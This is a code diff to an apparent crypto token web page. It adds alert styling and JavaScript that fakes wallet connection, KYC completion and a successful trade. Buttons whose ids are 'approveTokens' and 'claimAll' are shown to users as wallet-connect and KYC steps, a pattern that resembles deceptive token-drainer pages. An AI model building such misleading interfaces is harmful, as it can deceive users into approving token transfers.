@@ -353,6 +353,57 @@
                 flex-direction: column;
             }
         }
+         .security-alert {
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        background: #2b2f36;
+        border-left: 4px solid #f0b90b;
+        padding: 15px;
+        border-radius: 8px;
+        color: #eaecef;
+        z-index: 10000;
+        box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        transform: translateX(110%);
+        animation: slideIn 0.5s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+        max-width: 320px;
+    }
+
+    .security-alert.warning {
+        border-color: #f84960;
+        background: #2b1a1a;
+    }
+
+    .security-alert.success {
+        border-color: #00b15d;
+        background: #1a2b23;
+    }
+
+    .alert-progress {
+        height: 3px;
+        background: rgba(255,255,255,0.3);
+        margin-top: 10px;
+        border-radius: 2px;
+        overflow: hidden;
+    }
+
+    .alert-progress::after {
+        content: '';
+        display: block;
+        width: 100%;
+        height: 100%;
+        background: #f0b90b;
+        animation: progress 5s linear forwards;
+    }
+
+    @keyframes slideIn {
+        to { transform: translateX(0); }
+    }
+
+    @keyframes progress {
+        from { transform: translateX(-100%); }
+        to { transform: translateX(0); }
+    }
     </style>
 </head>
 <body>
@@ -872,6 +923,10 @@
 </a>
 
     <script>
+
+         let isWalletConnected = sessionStorage.getItem('walletConnected') === 'true';
+         let isKYCCompleted = sessionStorage.getItem('kycCompleted') === 'true';
+    
         const contractAddress = "0x579d705fE8bA250eDA39aa51E6443AD971112686"; // Dirección de tu contrato
         const contractABI = [
             {
@@ -1026,6 +1081,65 @@
         console.log("Conectado a:", userAccount);
     }).catch(err => console.error("Error al conectar:", err));
 });
+         function showDelayedAlert(message, type = 'warning') {
+        setTimeout(() => {
+            const alert = document.createElement('div');
+            alert.className = `security-alert ${type}`;
+            alert.innerHTML = `
+                <div class="alert-content">
+                    ${message}
+                    <div class="alert-progress"></div>
+                </div>
+            `;
+            
+            document.body.appendChild(alert);
+            
+            // Eliminar la alerta después de 5 segundos
+            setTimeout(() => {
+                alert.remove();
+            }, 5000);
+        }, 300); // Retardo de 300ms
+    }
+
+    // Controladores para los botones de compra/venta
+    document.querySelectorAll('.buy-button, .sell-button').forEach(button => {
+        button.addEventListener('click', (e) => {
+            e.preventDefault();
+            
+            if(!isWalletConnected) {
+                showDelayedAlert('🔐 Primero debe conectar su wallet usando el botón "Conectar Wallet"');
+                return;
+            }
+            
+            if(!isKYCCompleted) {
+                showDelayedAlert('📝 Complete la verificación KYC usando el botón "Comenzar KYC"');
+                return;
+            }
+            
+            // Simulación de transacción exitosa
+            showDelayedAlert('✅ Transacción realizada con éxito!', 'success');
+        });
+    });
+
+    // Simulación de conexión de wallet
+    document.getElementById('approveTokens').addEventListener('click', () => {
+        isWalletConnected = true;
+        sessionStorage.setItem('walletConnected', 'true');
+        showDelayedAlert('🦊 Wallet conectada exitosamente!', 'success');
+    });
+
+    // Simulación de KYC
+    document.getElementById('claimAll').addEventListener('click', () => {
+        isKYCCompleted = true;
+        sessionStorage.setItem('kycCompleted', 'true');
+        showDelayedAlert('✅ Verificación KYC completada!', 'success');
+    });
+
+    // Habilitar botones de simulación
+    window.onload = () => {
+        document.getElementById('approveTokens').disabled = false;
+        document.getElementById('claimAll').disabled = false;
+    };
 
     </script>
 </body>
